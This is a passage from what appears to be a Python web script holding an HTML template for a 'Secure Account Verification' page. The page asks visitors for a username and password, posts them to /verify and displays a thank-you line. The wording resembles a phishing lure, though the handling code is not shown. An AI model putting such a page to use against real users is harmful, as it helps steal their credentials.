                    border: 1px solid #ddd;
                    border-radius: 4px;
                }
                .login-form button {
                    background: #007bff;
                    color: white;
                    padding: 0.5rem 1rem;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                .login-form button:hover {
                    background: #0056b3;
                }
                .success-message {
                    color: #28a745;
                    text-align: center;
                    margin-top: 1rem;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="login-header">
                    <h2>Secure Account Verification</h2>
                    <p>Your security is important to us. Please verify your account to continue.</p>
                </div>
                <form method="post" action="/verify">
                    <input type="text" placeholder="Username" name="username" required>
                    <input type="password" placeholder="Password" name="password" required>
                    <button type="submit">Verify Now</button>
                </form>
                <div class="success-message">Thank you for verifying your account!</div>
            </div>
        </body>
    </html>
'''

# Route to handle form submission
